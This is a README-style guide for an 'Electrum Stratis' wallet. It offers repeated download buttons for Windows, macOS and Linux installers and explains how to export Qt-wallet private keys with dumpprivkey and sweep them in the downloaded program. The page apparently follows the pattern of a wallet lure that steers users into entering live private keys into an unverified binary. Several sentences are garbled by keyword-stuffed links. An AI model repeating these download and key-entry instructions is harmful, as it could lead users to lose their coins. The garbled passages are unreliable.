![Electrum-Stratis](assets/banner-article.png)

# dumpprivkey to Sweep: moving coins out of the Qt wallet, in order

<p align="center">One address at a time</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The Qt wallet has no seed, so its coins move by key rather than by phrase: export each address's private key with `dumpprivkey`, then use Sweep in Electrum Stratis to spend those keys into a wallet you control. The two steps are separate on purpose - export produces a string you must protect, sweep spends it immediately, and the second step is what actually moves the funds. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Situation | What you need | What you do not need |
|---|---|---|
| Qt wallet with a balance | Each address's private key | A seed phrase |
| Several addresses funded | One export per address | A bulk export |
| Coins already sent to Core | A synced Core wallet first | A rescan in Electrum |
| Qt file but no password | Unlock, then export | A restore in Electrum |
| Old paper wallet | Its key, if you have it | Anything derivable |

</div>

The export is per address because the Qt wallet stores keys individually. There is no master phrase to hand over, which is exactly why the wallet cannot be restored from one.

## Why it happens

Two wallet designs meet here. The Qt wallet is a full node with a key store: keys were generated one at a time and saved in the wallet file, with no deterministic seed linking them. Electrum Stratis is seed-based: a wallet is a phrase, and every address follows from it. A key from the first design can be imported into the second, but it arrives as an exception - an imported key that the seed does not cover.

That exception is the thing to handle correctly. Sweep spends the key's full balance into addresses the seed does control, which retires the exception; a plain import keeps the key as a permanent appendix to the wallet, backed up by nothing but the wallet file. For a migration, sweep is the right verb.

## Fix

1. **Sync the Qt wallet first.** A key export is only meaningful if the wallet knows what the address holds. Let it reach the chain tip before exporting.
2. **Unlock the wallet.** The export command needs the passphrase that encrypts the key store; without it there is nothing to export.
3. **Export one key at a time.** Use the debug console's `dumpprivkey <address>` with an address the wallet controls, copy the resulting key, and treat it as a live spending credential from that moment.
4. **Sweep, do not import, in Electrum Stratis.** Open the private-key tool, paste the exported key, choose Sweep, set the fee, and send to an address from your own seed. The whole balance of that key moves in one transaction.
5. **Confirm the destination.** The sweep output goes to an address in the receiving wallet, so the coins become seed-backed immediately. Check the transaction, then delete any copy of the exported key you made along the way.

If an address holds nothing, the export still works and the sweep has nothing to spend - harmless, but a wasted fee if repeated carelessly. Sweep ships with the current build rather than as a separate download, so run the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) and use the private-key tool inside it. What comes out the other side is a [Electrum Stratis wallet types](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) from a derived address, which is exactly why [is Electrum Stratis safe](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md) between the two steps.

## If that did not work

If `dumpprivkey` is rejected, the address is probably not one the wallet controls - check that you copied it from this wallet's address list rather than from an exchange withdrawal record.

If the sweep reports no inputs, the key's address is empty on the chain the wallet is connected to. Confirm the balance in the Qt wallet and the height in Electrum Stratis before retrying.

If the Qt wallet will not sync at all, the export is blocked rather than the migration being impossible: keys live in the file, but the balance needs the chain. Fix connectivity first, then export.

If you exported a key and are unsure whether it was spent, look the address up rather than re-importing it somewhere else. Re-importing duplicates exposure without moving anything.

## Prevention

- Never paste an exported key into a website, a chat or a form.
- Sweep immediately after exporting, so the key's window of exposure is minutes.
- Keep the Qt wallet file backed up until every address is emptied.
- Record which addresses you have already migrated.
- Delete exported keys from notes and clipboards once the sweep confirms.
- Sweep with the actively maintained build; an installer from years ago may not carry the tool.

## FAQ

### Does the Qt wallet have a seed phrase?

No. It stores individually generated keys in a wallet file, with no deterministic phrase above them. That is why no seed restore exists for it, and why migration works key by key rather than by phrase.

### Can I import the key instead of sweeping it?

You can, but a sweep is the better end state: it moves the balance to addresses your seed derives, so one backup covers everything. An imported key stays outside the seed and needs the wallet file to survive.

### How do I move STRAT from the Qt wallet to Electrum Stratis?

Sync and unlock the Qt wallet, export each funded address's key with `dumpprivkey`, then use Sweep in Electrum Stratis with that key and send to an address from your own seed. Repeat per address until the old wallet is empty.

### Is exporting a private key dangerous?

It creates a live credential in plain text, so the danger is in where it goes. Keep it on the same machine, paste it only into the wallet's own sweep tool, and treat any other request for it as theft.

<!-- DOWNLOAD-BLOCK -->

Exporting a key is a one-time operation and a permanent exposure. Once the private key exists as text on a screen it should be treated as compromised, even if the machine is clean. Sweep the whole address to a seed-backed wallet in the same session, confirm the transaction, then stop using the old address entirely. A partial sweep leaves a key worth stealing.

## Related articles

- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [Coins sent to Core, and what the balance waits for](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/coins-sent-to-core-wallet.md)
- [Moving coins between wallets without losing fees](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/move-coins-without-wasting-fees.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
